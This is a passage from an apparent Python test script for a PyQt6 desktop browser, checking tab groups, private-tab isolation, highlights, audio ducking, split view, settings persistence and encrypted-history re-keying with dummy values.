_on100 = getattr(br, "_pad_timer", None) is not None and br._pad_timer.isActive()
br.bridge.setSetting("gamepadOn", "false")
_off100 = getattr(br, "_pad_timer", None) is None \
    or not br._pad_timer.isActive()
br.config["gamepadOn"] = _gp100
check("the Settings gamepad switch starts and stops the tab poll",
      _on100 and _off100, str((_on100, _off100)))

# ===== fourth pass, part 7: tab moves and site-wide tab actions ==========
_sess101 = list(br.sessions)
if not any(e.get("sid") == "rv101" for e in br.sessions):
    br.sessions.append({"name": "Review 101", "sid": "rv101"})
_r101 = br.open_tab_state([{"u": srv.url("/twhome"), "s": "rv101",
                            "t": "Home 101"}], lazy=False)
H.spin(400)
_mv101 = _r101[0] if _r101 else None
_win101 = None
_got101 = None
if _mv101 is not None:
    _mv101.locked = True
    _mv101.tab_name = "Named 101"
    _win101 = br.move_tab_to_window(br.tabs.indexOf(_mv101))
    H.spin(900)
    if _win101 is not None:
        _rows101 = [w for _i, w in _win101._real_tabs()]
        _got101 = [(getattr(w, "session", None),
                    bool(getattr(w, "locked", False)),
                    getattr(w, "tab_name", None)) for w in _rows101]
        for w in _rows101:
            w.locked = False
check("a tab moved to its own window keeps its browser, lock and name",
      _got101 == [("rv101", True, "Named 101")], str(_got101))
try:
    if _win101 is not None:
        _win101.close()
except RuntimeError:
    pass
H.spin(400)
_a101 = br.new_tab(url=srv.url("/twhome"), switch=False); H.spin(200)
_b101 = br.new_tab(url=srv.url("/twhome?x=1"), switch=False); H.spin(200)
_c101 = br.new_tab(url=srv.url("/twhome?x=2"), switch=False,
                   session="rv101"); H.spin(200)
_d101 = br.new_tab(url=srv.url("/twhome?x=3"), switch=False); H.spin(200)
_p101 = br.new_tab(url=srv.url("/twhome?x=4"), switch=False,
                   private=True); H.spin(200)
H.wait_for(lambda: all("/twhome" in w.url().toString()
                       for w in (_a101, _b101, _c101, _d101, _p101)), 8000)
_d101.locked = True
_guard101 = br.new_tab(switch=False); H.spin(200)   # keeps the window up
_gone101 = br.close_site_tabs(br.tabs.indexOf(_a101))
H.spin(300)
def _in_strip101(w):
    try:
        return br.tabs.indexOf(w) >= 0
    except RuntimeError:
        return False          # closed and already deleted
_left101 = [_in_strip101(w) for w in (_a101, _b101, _c101, _d101, _p101)]
check("closing a site's tabs leaves other browsers', locked and private ones",
      _left101 == [False, False, True, True, True], str(_left101))
try:
    _d101.locked = False
except RuntimeError:
    pass
for w in (_c101, _d101, _p101, _guard101):
    if _in_strip101(w):
        br.close_tab(br.tabs.indexOf(w), ask=False)
H.spin(300)
_e101 = br.new_tab(url=srv.url("/twhome?x=5"), switch=False); H.spin(200)
_f101 = br.new_tab(url=srv.url("/twhome?x=6"), switch=False); H.spin(200)
_g101 = br.new_tab(url=srv.url("/twhome?x=7"), switch=False,
                   private=True); H.spin(200)
_h101 = br.new_tab(url=srv.url("/twhome?x=8"), switch=False,
                   session="rv101"); H.spin(200)
H.wait_for(lambda: all("/twhome" in w.url().toString()
                       for w in (_e101, _f101, _g101, _h101)), 8000)
_host101 = _e101.url().host()
_name101 = br.stack_site_tabs(host=_host101, on=False)
H.spin(300)
_grp101 = [br._group_of(w) for w in (_e101, _f101, _g101, _h101)]
check("folding a site's tabs leaves private and other-browser tabs out",
      _grp101[0] == _grp101[1] == _name101 and _grp101[2] != _name101
      and _grp101[3] != _name101, str((_name101, _grp101)))
for w in (_e101, _f101, _g101, _h101):
    _close_if_open(w)
H.spin(300)
if _name101 and br._header_index(_name101) is not None:
    try:
        br.ungroup(_name101)
    except Exception:
        pass
br.sessions[:] = _sess101

# ===== fourth pass, part 8: pop-out return, fills, reader, typed lines ====
import os
_sess102 = list(br.sessions)
if not any(e.get("sid") == "rv102" for e in br.sessions):
    br.sessions.append({"name": "Review 102", "sid": "rv102"})
_pg102 = br.new_tab(url=srv.url("/twhome?pg=1"), switch=True); H.spin(300)
br._register_group("Pop102", "#89b4fa")
br._move_tab_to_group(br.tabs.indexOf(_pg102), "Pop102")
_keep102 = br.new_tab(url=srv.url("/twhome?pg=2"), switch=False,
                      group="Pop102"); H.spin(300)
_mini102 = br.pop_out_tab(br.tabs.indexOf(_pg102)); H.spin(300)
br.ungroup("Pop102"); H.spin(100)
_err102 = ""
try:
    if _mini102 is not None:
        _mini102.close()
    H.spin(300)
except Exception as _e:
    _err102 = repr(_e)
_back102 = br.tabs.indexOf(_pg102) >= 0
_grp102 = getattr(_pg102, "group", "x") if _back102 else "gone"
check("a popped-out tab whose group was removed comes back loose",
      _mini102 is not None and _back102 and _grp102 is None and not _err102,
      str((_mini102 is not None, _back102, _grp102, _err102)))
check("a removed group leaves no browser or id behind",
      "Pop102" not in br.group_sessions and "Pop102" not in br.group_ids,
      str((br.group_sessions.get("Pop102"), br.group_ids.get("Pop102"))))
for w in (_pg102, _keep102):
    _close_if_open(w)
H.spin(200)
if br.vault is not None and not br.vault_locked():
    _fv102 = br.new_tab(url=srv.url("/twhome?fill=1"), switch=False)
    H.wait_for(lambda: "/twhome" in _fv102.url().toString(), 8000)
    _vpw102 = br.config.get(B.VAULT_PASSWORD_KEY, "__absent__")
    br.config[B.VAULT_PASSWORD_KEY] = True
    _ok102 = br.fill_login_now(view=_fv102, entry={
        "id": "not-for-this-site-102", "username": "u102",
        "password": "p102"})
    if _vpw102 == "__absent__":
        br.config.pop(B.VAULT_PASSWORD_KEY, None)
    else:
        br.config[B.VAULT_PASSWORD_KEY] = _vpw102
    br.close_tab(br.tabs.indexOf(_fv102), ask=False)
    check("a login chosen for another site is not filled into this one",
          _ok102 is False, str(_ok102))
_hl102 = br.config.get("highlights", "__absent__")
br.config["highlights"] = {"https://a.example/": ["old a1", "old a2"],
                           "https://b.example/": ["new b"]}
_all102 = [r["text"] for r in br.all_highlights()]
if _hl102 == "__absent__":
    br.config.pop("highlights", None)
else:
    br.config["highlights"] = _hl102
check("the highlight library lists the newest first",
      _all102 == ["new b", "old a2", "old a1"], str(_all102))
_np102 = br.new_tab(url=srv.url("/twhome?np=1"), switch=False)
H.wait_for(lambda: "/twhome" in _np102.url().toString(), 8000)
_np102.setHtml(
    '<p><a href="/twhome?wrong=1">Weiterlesen</a> '
    '<a href="/twhome?wrong=2">Next</a> in the header</p>'
    '<a rel="nofollow next" href="/twhome?page=2">2</a>',
    B.QUrl(srv.url("/twhome?np=1")))
H.spin(600)
_nx102 = {}
br.read_page_tool("nextpage", view=_np102,
                  then=lambda r: _nx102.update(v=r))
H.wait_for(lambda: "v" in _nx102, 5000)
br.close_tab(br.tabs.indexOf(_np102), ask=False)
check("the reader's next page is the page's own rel=next link",
      str(_nx102.get("v") or "").endswith("/twhome?page=2"), str(_nx102))
_rt102 = (br._resolve_typed("mailto:me@site.example"),
          br._resolve_typed("about:blank"))
check("mailto: and about: typed are opened, not mangled or searched",
      _rt102 == ("mailto:me@site.example", "about:blank"), str(_rt102))
check("a launch flag is never taken as the address",
      B._launch_url("-platform") is None
      and B._launch_url("--remote-debugging-port=9") is None)
_asked102 = []
_saved102 = (B.gpu_cards, B._gpu_config, B._gpu_ask_window,
             os.environ.get("QT_QPA_PLATFORM"))
B.gpu_cards = lambda: [{"id": "a"}, {"id": "b"}]
B._gpu_config = lambda: {"gpuAsk": True}
B._gpu_ask_window = lambda *a, **k: _asked102.append(1)
os.environ["QT_QPA_PLATFORM"] = "offscreen"
_mark102 = os.environ.pop(B._GPU_MARK, None)
try:
    B._gpu_startup()
finally:
    B.gpu_cards, B._gpu_config, B._gpu_ask_window = _saved102[:3]
    if _saved102[3] is None:
        os.environ.pop("QT_QPA_PLATFORM", None)
    else:
        os.environ["QT_QPA_PLATFORM"] = _saved102[3]
    if _mark102 is not None:
        os.environ[B._GPU_MARK] = _mark102
check("a headless start never puts up the card chooser",
      _asked102 == [], str(_asked102))
_pos102 = (br.config.get("newTabPos", "__absent__"))
br.config["newTabPos"] = "after"
_pa102 = br.new_tab(url=srv.url("/twhome?pin=1"), switch=False); H.spin(200)
_pb102 = br.new_tab(url=srv.url("/twhome?pin=2"), switch=False); H.spin(200)
br.pin_tab(br.tabs.indexOf(_pa102), True)
br.pin_tab(br.tabs.indexOf(_pb102), True)
H.spin(200)
br.tabs.setCurrentIndex(br.tabs.indexOf(_pa102)); H.spin(100)
_pc102 = br.new_tab(url=srv.url("/twhome?pin=3"), switch=False); H.spin(200)
_ia102, _ib102, _ic102 = (br.tabs.indexOf(_pa102), br.tabs.indexOf(_pb102),
                          br.tabs.indexOf(_pc102))
if _pos102 == "__absent__":
    br.config.pop("newTabPos", None)
else:
    br.config["newTabPos"] = _pos102
check("a tab opened after a pinned tab lands after the pinned block",
      _ic102 > max(_ia102, _ib102), str((_ia102, _ib102, _ic102)))
for w in (_pa102, _pb102):
    try:
        if br.tabs.indexOf(w) >= 0:
            br.pin_tab(br.tabs.indexOf(w), False)
    except RuntimeError:
        pass          # closed and deleted on the way
for w in (_pa102, _pb102, _pc102):
    _close_if_open(w)
H.spin(200)
_cy102 = br.new_tab(url=srv.url("/twhome?cy=1"), switch=True); H.spin(200)
_cz102 = br.new_tab(url=srv.url("/twhome?cy=2"), switch=False,
                    session="rv102"); H.spin(200)
_seen102 = set()
for _k in range(6):
    br.cycle_group_tabs(1); H.spin(50)
    _cur = br.current()
    _seen102.add(getattr(_cur, "session", "main"))
check("Ctrl+Alt+Tab on a loose tab stays in this virtual browser",
      "rv102" not in _seen102, str(_seen102))
br.switch_session("main")
for w in (_cy102, _cz102):
    _close_if_open(w)
H.spin(200)
_sets102 = json.dumps(br.config.get("tabSets") or {})
_ts102 = br.new_tab(url=srv.url("/twhome?set=1"), switch=False); H.spin(300)
H.wait_for(lambda: "/twhome" in _ts102.url().toString(), 8000)
br.save_tabset("Review102")
_pt102 = br.new_tab(url=srv.url("/twhome?set=priv"), switch=False,
                    private=True); H.spin(300)
_new102 = br.restore_tabset("Review102", replace=True); H.spin(400)
_priv_alive102 = br.tabs.indexOf(_pt102) >= 0
for w in list(_new102) + [_pt102, _ts102]:
    _close_if_open(w)
br.config["tabSets"] = json.loads(_sets102)
check("switching tab sets leaves the private tabs open",
      _priv_alive102, str(_priv_alive102))
H.spin(200)
_lg102 = br.new_tab(url=srv.url("/twhome?lock=1"), switch=False); H.spin(300)
H.wait_for(lambda: "/twhome" in _lg102.url().toString(), 8000)
br._register_group("Lock102", "#a6e3a1")
br._move_tab_to_group(br.tabs.indexOf(_lg102), "Lock102")
_lg102.locked = True
_lg102.tab_name = "Kept 102"
br._save_groups(quiet=True)
_saved_rows102 = [r for g in br.config.get("tabGroups", [])
                  if g.get("name") == "Lock102" for r in g.get("urls", [])]
_lg102.locked = False
br.close_tab(br.tabs.indexOf(_lg102), ask=False)
H.spin(200)
check("a grouped tab's lock and name are saved with the group",
      any(r.get("l") and r.get("n") == "Kept 102" for r in _saved_rows102),
      str(_saved_rows102))
br.sessions[:] = _sess102

# ===== fourth pass, part 9: highlights, ducking, split, cookies, fonts ===
_hv103 = br.new_tab(url=srv.url("/twhome?hl=1"), switch=True)
H.wait_for(lambda: "/twhome" in _hv103.url().toString(), 8000)
_hv103.setHtml("<p id=p>the end and the end</p>",
               B.QUrl(srv.url("/twhome?hl=1")))
H.wait_for(lambda: jsq(_hv103, "!!document.getElementById('p')") is True,
           5000)
H.js(_hv103, "var t=document.getElementById('p').firstChild;"
     "var r=document.createRange();r.setStart(t,12);r.setEnd(t,19);"
     "var s=getSelection();s.removeAllRanges();s.addRange(r);true")
_hls103 = br.config.get("highlights", "__absent__")
br.add_highlight(_hv103)
H.wait_for(lambda: jsq(_hv103, "document.querySelectorAll('mark.__hl')"
                               ".length") == 1, 5000)
_first103 = jsq(_hv103, "document.getElementById('p').firstChild.nodeValue")
if _hls103 == "__absent__":
    br.config.pop("highlights", None)
else:
    br.config["highlights"] = _hls103
check("a highlight marks the occurrence he selected, not the first one",
      _first103 == "the end and ", str(_first103))
br.close_tab(br.tabs.indexOf(_hv103), ask=False)
H.spin(200)
_dk103 = []
_real_mt103 = br.media_tool2
br.media_tool2 = lambda name, view=None, then=None, arg=None: (
    _dk103.append((name, view, arg)) or True)
_duck_was103 = br.config.get("duckLevel", "__absent__")
br.config["duckLevel"] = 0.2
_fr103 = br.new_tab(url=srv.url("/twhome?duck=1"), switch=True); H.spin(200)
_bg103 = br.new_tab(url=srv.url("/twhome?duck=2"), switch=False); H.spin(200)
try:
    _bg103.page().recentlyAudible = lambda: True
    br.duck_others(_fr103)
    _ducked103 = [(n, a) for n, v, a in _dk103 if v is _bg103]
    del _dk103[:]
    br._audible_changed(_fr103, False)
    _back103 = [(n, a) for n, v, a in _dk103 if v is _bg103]
finally:
    br.media_tool2 = _real_mt103
    if _duck_was103 == "__absent__":
        br.config.pop("duckLevel", None)
    else:
        br.config["duckLevel"] = _duck_was103
check("a ducked tab gets its volume back when the front tab goes quiet",
      _ducked103 == [("duck", 0.2)] and _back103 == [("duck", None)],
      str((_ducked103, _back103)))
for w in (_fr103, _bg103):
    _close_if_open(w)
H.spin(200)
_pw103 = br.config.get("panelWidth", "__absent__")
_sa103 = br.new_tab(url=srv.url("/twhome?split=1"), switch=True); H.spin(300)
_sb103 = br.new_tab(url=srv.url("/twhome?split=2"), switch=False); H.spin(300)
br.split_view(index=br.tabs.indexOf(_sb103), on=True); H.spin(300)
br.toggle_panel(True); H.spin(300)


def _size103(w):
    at = br._split.indexOf(w)
    sizes = br._split.sizes()
    return sizes[at] if 0 <= at < len(sizes) else 0


_sizes103 = (_size103(br.tabs), _size103(br._splitview), _size103(br._panel))
_sz103 = br._split.sizes()
_pi103 = br._split.indexOf(br._panel)
if 0 <= _pi103 < len(_sz103):
    _sz103[_pi103] = 333
    br._split.setSizes(_sz103)
H.spin(100)
_want103 = _size103(br._panel)
br.toggle_panel(False); H.spin(200)
_saved103 = br.config.get("panelWidth")
check("with a split view up the panel opens beside both halves",
      all(s > 50 for s in _sizes103), str(_sizes103))
check("...and its width is still remembered when it closes",
      _saved103 == _want103 and _want103 > 80, str((_saved103, _want103)))
_tr103 = []
_real_tn103 = br.translate_page_now
br.translate_page_now = lambda view=None, lang=None: _tr103.append(view)
try:
    br.translate_side_by_side(view=_sa103)
    H.spin(400)
    _still103 = br.split_showing()
    _new103 = br._split_view
finally:
    br.translate_page_now = _real_tn103
check("translating side by side with a split up makes a new split",
      _still103 and _new103 is not None and _new103 is not _sb103,
      str((_still103, _new103 is _sb103)))
br.close_split(); H.spin(200)
for w in (_sa103, _sb103, _new103):
    try:
        if w is not None:
            _close_if_open(w)
    except RuntimeError:
        pass
if _pw103 == "__absent__":
    br.config.pop("panelWidth", None)
else:
    br.config["panelWidth"] = _pw103
H.spin(200)
_strip103 = br.config.get("stripTracking", "__absent__")
br.config["stripTracking"] = True
_fs103 = br.new_tab(url=srv.url("/twhome?form=1"), switch=False)
H.wait_for(lambda: "/twhome" in _fs103.url().toString(), 8000)
_st103 = []
_real_ps103 = br.privacy_stripped
br.privacy_stripped = lambda: _st103.append(1)
NT103 = B.QWebEnginePage.NavigationType
try:
    _fs103.page().acceptNavigationRequest(
        B.QUrl(srv.url("/twhome?utm_source=x&a=1")),
        NT103.NavigationTypeFormSubmitted, True)
    _form103 = len(_st103)
    _fs103.page().acceptNavigationRequest(
        B.QUrl(srv.url("/twhome?utm_source=x&a=2")),
        NT103.NavigationTypeLinkClicked, True)
    _link103 = len(_st103) - _form103
finally:
    br.privacy_stripped = _real_ps103
    if _strip103 == "__absent__":
        br.config.pop("stripTracking", None)
    else:
        br.config["stripTracking"] = _strip103
H.spin(300)
br.close_tab(br.tabs.indexOf(_fs103), ask=False)
check("a submitted form is not re-sent as a GET to strip its address",
      _form103 == 0 and _link103 == 1, str((_form103, _link103)))
try:
    _cm103 = br.cookie_menu(host="private103.example", private=True)
    _cm_on103 = [a.isEnabled() for a in _cm103.actions() if a.isCheckable()]
except TypeError:
    _cm_on103 = [True]
check("no cookie rule can be set from a private tab",
      _cm_on103 and not any(_cm_on103), str(_cm_on103))
_prof103 = br.profile if hasattr(br, "profile") else None
_fonts103 = json.dumps(br.config.get("siteFonts") or {})
_set103 = B.QWebEngineProfile.defaultProfile().settings() \
    if _prof103 is None else _prof103.settings()
_F103 = B.QWebEngineSettings.FontFamily.SansSerifFont
_before103 = _set103.fontFamily(_F103)
br.config["siteFonts"] = {"sans": "Review103 Sans"}
br.apply_site_fonts()
_mid103 = _set103.fontFamily(_F103)
br.config["siteFonts"] = {}
br.apply_site_fonts()
_after103 = _set103.fontFamily(_F103)
br.config["siteFonts"] = json.loads(_fonts103)
br.apply_site_fonts()
check("an emptied site-font box puts the engine's font back",
      _mid103 == "Review103 Sans" and _after103 == _before103,
      str((_before103, _mid103, _after103)))
_pe103 = br.config.get("privateEngine", "__absent__")
_se103 = br.config.get("searchEngine", "__absent__")
br.config["privateEngine"] = "duckduckgo"
br.config["searchEngine"] = "google"
_pv103 = br.new_tab(private=True, switch=False); H.spin(300)
try:
    _ps103 = br._private_start_search(
        B.QUrl("https://www.google.com/search?q=hello+review"), _pv103)
except AttributeError:
    _ps103 = None
for _k, _v in (("privateEngine", _pe103), ("searchEngine", _se103)):
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.close_tab(br.tabs.indexOf(_pv103), ask=False)
check("a private tab's start-page search goes to the private engine",
      _ps103 is not None
      and _ps103.toString().startswith("https://duckduckgo.com/")
      and "review" in _ps103.toString(), str(_ps103))
_pwsrc103 = (_Path(B.__file__).parent / "passwords.html").read_text()
check("the password search looks at values and a failed export says so",
      'searchText(it, "")' in _pwsrc103 and "d.error" in _pwsrc103
      and 'dispatchEvent(new Event("input"' in _pwsrc103)
_sp103 = (_Path(B.__file__).parent / "start.html").read_text()
check("the start page takes the shared quick links and stops a slideshow",
      "if (data.setupDone) {" in _sp103 and "window.__wallShown" in _sp103)
H.spin(200)

# ===== fourth pass, part 10: a quiet save of a shown setting ==============
br.save_config(quiet=True)
_r104 = B._page_data_rev
br.save_config(quiet=True)
_same104 = B._page_data_rev == _r104
br.config["sessionTabs"] = dict(br.config.get("sessionTabs") or {},
                                rv104=[])
br.save_config(quiet=True)
_timer104 = B._page_data_rev == _r104
(br.config.get("sessionTabs") or {}).pop("rv104", None)
br.save_config(quiet=True)
_r104 = B._page_data_rev
_sb104 = br.config.get("scrollbars", "__absent__")
br.config["scrollbars"] = "review104"
br.save_config(quiet=True)
_bumped104 = B._page_data_rev > _r104
if _sb104 == "__absent__":
    br.config.pop("scrollbars", None)
else:
    br.config["scrollbars"] = _sb104
br.save_config(quiet=True)
check("a quiet save of a setting Settings shows marks the pane stale",
      _bumped104 and _same104 and _timer104,
      str((_bumped104, _same104, _timer104)))

# ===== review of the fourth pass: split save, export, reader, duck, heir ==
_sx105 = br.new_tab(url=srv.url("/twhome?sp=1"), switch=True); H.spin(300)
_sy105 = br.new_tab(switch=False); H.spin(400)          # a start page
br.split_view(index=br.tabs.indexOf(_sy105), on=True); H.spin(300)
br._save_groups(quiet=True)
_rows105 = [r.get("u", "") for rows in
            (br.config.get("sessionTabs") or {}).values() for r in rows]
_start105 = [u for u in _rows105 if B._same_page(B.QUrl(u), B.START_PAGE)]
br.close_split(); H.spin(200)
check("a start page in the split view is not saved as a tab",
      not _start105, str(_start105))
_sg105 = br.new_tab(url=srv.url("/twhome?sg=1"), switch=False); H.spin(300)
H.wait_for(lambda: "/twhome" in _sg105.url().toString(), 8000)
br._register_group("Split105", "#f9e2af")
br._move_tab_to_group(br.tabs.indexOf(_sg105), "Split105")
_sh105 = br.new_tab(url=srv.url("/twhome?sg=2"), switch=False,
                    group="Split105"); H.spin(300)
br.tabs.setCurrentIndex(br.tabs.indexOf(_sx105)); H.spin(100)
br.split_view(index=br.tabs.indexOf(_sg105), on=True); H.spin(300)
br._save_groups(quiet=True)
_gu105 = [r.get("u", "") for g in br.config.get("tabGroups", [])
          if g.get("name") == "Split105" for r in g.get("urls", [])]
br.close_split(); H.spin(200)
check("a grouped tab in the split view is saved with its group",
      any("sg=1" in u for u in _gu105), str(_gu105))
for w in (_sx105, _sy105, _sg105, _sh105):
    _close_if_open(w)
H.spin(200)
check("a group whose last tab closes forgets its browser and id",
      "Split105" not in br.group_sessions and "Split105" not in br.group_ids,
      str((br.group_sessions.get("Split105"), br.group_ids.get("Split105"))))
_hl105 = br.config.get("highlights", "__absent__")
br.config["highlights"] = {"https://a105.example/": ["first", "second",
                                                     "third"]}
_xp105 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))) / "h.md"
br.export_highlights(path=str(_xp105))
_md105 = _xp105.read_text() if _xp105.exists() else ""
if _hl105 == "__absent__":
    br.config.pop("highlights", None)
else:
    br.config["highlights"] = _hl105
check("the highlight export keeps a page's highlights in the order marked",
      0 <= _md105.find("first") < _md105.find("second") < _md105.find("third"),
      _md105[-80:])
_rn105 = br.new_tab(url=srv.url("/twhome?rn=1"), switch=False)
H.wait_for(lambda: "/twhome" in _rn105.url().toString(), 8000)
_real_rpt105 = br.read_page_tool
br.read_page_tool = lambda name, view=None, then=None, arg=None: (
    then(srv.url("/twhome?rn=2")) or True)
_rn105.load = lambda u: None
_rc0 = _rn105.receivers(_rn105.loadFinished)
try:
    br.reader_next_page(view=_rn105)
    br.reader_next_page(view=_rn105)
    _rc1 = _rn105.receivers(_rn105.loadFinished)
finally:
    br.read_page_tool = _real_rpt105
    try:
        _rn105.loadFinished.disconnect(_rn105._reader_landed)
    except Exception:
        pass
    _rn105.__dict__.pop("load", None)
br.close_tab(br.tabs.indexOf(_rn105), ask=False)
check("next page pressed twice leaves one waiter for the reader",
      _rc1 - _rc0 == 1, str((_rc0, _rc1)))
_dk105 = []
_real_mt105 = br.media_tool2
br.media_tool2 = lambda name, view=None, then=None, arg=None: (
    _dk105.append((name, view, arg)) or True)
_dl105 = br.config.get("duckLevel", "__absent__")
br.config["duckLevel"] = 0.3
_da105 = br.new_tab(url=srv.url("/twhome?da=1"), switch=False); H.spin(200)
_db105 = br.new_tab(url=srv.url("/twhome?da=2"), switch=True); H.spin(200)
br._ducked, br._ducked_by = [_db105], _da105
try:
    br.duck_others(_db105)
finally:
    br.media_tool2 = _real_mt105
    if _dl105 == "__absent__":
        br.config.pop("duckLevel", None)
    else:
        br.config["duckLevel"] = _dl105
_own105 = [a for n, v, a in _dk105 if v is _db105]
check("a ducked tab that starts playing in front gets its volume back",
      _own105 == [None] and _db105 not in (br._ducked or []),
      str((_own105, len(br._ducked or []))))
br._ducked, br._ducked_by = [], None
for w in (_da105, _db105):
    _close_if_open(w)
H.spin(200)
_w2_105 = br.new_window(); H.spin(800)
_w3_105 = br.new_private_window(); H.spin(800)
_w2_105._session_timer.start()
_w2_105.close(); H.spin(600)
_w3_writes105 = _w3_105._session_timer.isActive()
_br_writes105 = br._session_timer.isActive()
try:
    _w3_105.close()
except RuntimeError:
    pass
H.spin(600)
check("closing the session-writing window never hands it to a private one",
      not _w3_writes105 and _br_writes105,
      str((_w3_writes105, _br_writes105)))
_pwh105 = (_Path(B.__file__).parent / "passwords.html").read_text()
check("the two-factor code is asked for at once, not a second later",
      "tick(true);" in _pwh105)

# ===== fifth/sixth pass, part 1: lock, recording, settings, vault, keys ===
_ep106 = None
if B.HAVE_ENGINE_PANE:
    _cov106 = getattr(br, "_lock_cover", None)
    br._lock_cover = object()
    try:
        for _sc in br.findChildren(B.QShortcut):
            if _sc.key().toString() == "Ctrl+Shift+E":
                _sc.activated.emit()
        H.spin(300)
        _ep106 = getattr(br, "_engine_pane", None)
        _ep_up106 = bool(_ep106 is not None and _ep106.isVisible())
    finally:
        br._lock_cover = _cov106
    check("the engine pane does not open behind the window lock",
          not _ep_up106, str(_ep_up106))
_rc106 = br.config.get("recordClicks", "__absent__")
br.config["recordClicks"] = True
_rt106 = br.new_tab(url=srv.url("/twhome?rec=1"), switch=True)
H.wait_for(lambda: "/twhome" in _rt106.url().toString(), 8000)
H.spin(300)
_err106 = ""
try:
    br.start_recording(view=_rt106, fps=4)
    H.spin(700)
    br.close_tab(br.tabs.indexOf(_rt106), ask=False)
    H.spin(800)
except Exception as _e:
    _err106 = repr(_e)
_still106 = br.recording_now() is not None
if _still106:
    br.stop_recording(save=False)
if _rc106 == "__absent__":
    br.config.pop("recordClicks", None)
else:
    br.config["recordClicks"] = _rc106
check("closing the recorded tab ends the recording cleanly",
      not _still106 and not _err106, str((_still106, _err106)))
_gs106 = json.loads(br.bridge.getSettings())
check("Settings is sent the appearance values it shows",
      all(k in _gs106 for k in ("warmNight", "autoHideChrome", "uiFont",
                                "siteFonts", "darkSiteRules",
                                "noUiAnimation", "scrollbars")),
      str([k for k in ("warmNight", "siteFonts", "noUiAnimation")
           if k not in _gs106]))
_dl106 = br.config.get("duckLevel", "__absent__")
br.config["duckLevel"] = 0
_dt106 = br.new_tab(url=srv.url("/twhome?d0=1"), switch=False); H.spin(200)
_dt106.page().recentlyAudible = lambda: True
_dn106 = br.duck_others(br.current())
if _dl106 == "__absent__":
    br.config.pop("duckLevel", None)
else:
    br.config["duckLevel"] = _dl106
br.close_tab(br.tabs.indexOf(_dt106), ask=False)
check("a duck level of 0 is off, not mute", _dn106 == 0, str(_dn106))
_he106 = br.config.get("historyEncrypted", "__absent__")
_mk106 = []
_real_mk106 = br.media_keys
br.media_keys = lambda on=None: _mk106.append(on) or bool(on)
try:
    if br.history_key() is None:
        br.bridge.setSetting("historyEncrypted", "true")
        _hon106 = br.config.get("historyEncrypted")
    else:
        _hon106 = False
    br.bridge.setSetting("mprisOn", "true")
finally:
    br.media_keys = _real_mk106
if _he106 == "__absent__":
    br.config.pop("historyEncrypted", None)
else:
    br.config["historyEncrypted"] = _he106
br.save_config(quiet=True)
check("history encryption from Settings is refused without a vault key",
      _hon106 is False, str(_hon106))
check("the media-keys switch in Settings starts the service",
      _mk106 == [True], str(_mk106))


class _FakeLock106:
    def __init__(self, new, old=None):
        self.new, self.old = new, old

    def derived_key(self, label):
        return B.hmac.new(self.new, b"derived:" + label.encode(),
                          B.hashlib.sha256).digest()

    def take_replaced_key(self):
        old, self.old = self.old, None
        return old


_hf_real106 = B.HISTORY_FILE
_hdir106 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
B.HISTORY_FILE = _hdir106 / "history.json"
_lock_real106 = br.vault_lock
_hist_real106 = list(br.history)
_flags106 = (getattr(br, "_history_locked", False),
             getattr(br, "_history_unsaved", False))
_old106, _new106 = b"o" * 32, b"n" * 32
_okey106 = B.hmac.new(_old106, b"derived:history", B.hashlib.sha256).digest()
B.HISTORY_FILE.write_bytes(B.HISTORY_MAGIC + B._seal(
    _okey106, json.dumps([{"url": "https://old106.example/"}]).encode(),
    aad=B.HISTORY_MAGIC))
try:
    br.config["historyEncrypted"] = True
    br.vault_lock = _FakeLock106(_new106, _old106)
    br._history_locked = True
    br.history[:] = [{"url": "https://new106.example/"}]
    try:
        br._rekey_history()
    except AttributeError:
        pass
    _nkey106 = br.vault_lock.derived_key("history")
    _raw106 = B.HISTORY_FILE.read_bytes()
    _plain106 = B._unseal(_nkey106, _raw106[len(B.HISTORY_MAGIC):],
                          aad=B.HISTORY_MAGIC)
    _rows106 = [r["url"] for r in json.loads(_plain106)] if _plain106 else []
    br._history_locked = False
    try:
        _was106 = br._history_out_of_vault()
    except AttributeError:
        _was106 = "missing"
    _after106 = B.HISTORY_FILE.read_bytes()
    _plain_ok106 = (not _after106.startswith(B.HISTORY_MAGIC)
                    and "old106" in _after106.decode("utf-8", "replace"))
finally:
    br.vault_lock = _lock_real106
    B.HISTORY_FILE = _hf_real106
    br.history[:] = _hist_real106
    br._history_locked, br._history_unsaved = _flags106
    if _he106 == "__absent__":
        br.config.pop("historyEncrypted", None)
    else:
        br.config["historyEncrypted"] = _he106
    br.save_config(quiet=True)
check("a new passphrase carries the encrypted history over",
      _rows106 == ["https://old106.example/", "https://new106.example/"],
      str(_rows106))
check("switching the master password off writes the history back readable",
      _was106 is True and _plain_ok106, str((_was106, _plain_ok106)))
_ks106 = br.config.get("keySequences", "__absent__")
br.config["keySequences"] = {"b": "bookmark"}
_ran106 = []
_real_ra106 = br.run_action
br.run_action = lambda a, *x, **k: _ran106.append(a)
_took106 = False
try:
    br.start_key_sequence()
    from PyQt6.QtGui import QKeyEvent as _QKE106
    _ev106 = _QKE106(B.QEvent.Type.KeyPress, B.Qt.Key.Key_B,
                     B.Qt.KeyboardModifier.NoModifier, "b")
    try:
        _took106 = br._chord_key(_ev106)
    except AttributeError:
        _took106 = False
finally:
    br.run_action = _real_ra106
    if hasattr(br, "_chord_end"):
        br._chord_end()
    else:
        br._chord_waiting = False
    if _ks106 == "__absent__":
        br.config.pop("keySequences", None)
    else:
        br.config["keySequences"] = _ks106
check("the letter after the leader key runs its command",
      _took106 and _ran106 == ["bookmark"], str((_took106, _ran106)))
_tr106 = {}
_real_ct106 = br.caption_tools
br.caption_tools = lambda: {"captionTranslator": "/bin/echo"}
try:
    try:
        br.run_translator("x" * 500, then=lambda out: _tr106.update(v=out),
                          limit=0)
        H.wait_for(lambda: "v" in _tr106, 5000)
    except TypeError:
        pass
finally:
    br.caption_tools = _real_ct106
check("a translated paragraph comes back whole, not its last 220 chars",
      len(_tr106.get("v", "")) > 500, str(len(_tr106.get("v", ""))))


class _CertErr106:
    def url(self):
        return B.QUrl("https://private106.example/")

    def description(self):
        return "bad"

    def isOverridable(self):
        return True

    def certificateChain(self):
        return []


_ce106 = json.dumps(br.certificate_exceptions())
_q106 = B.QMessageBox.question
B.QMessageBox.question = staticmethod(
    lambda *a, **k: B.QMessageBox.StandardButton.Yes)
_cf106 = br.certificate_for
br.certificate_for = lambda *a, **k: {"sha256": "ab" * 32}
try:
    try:
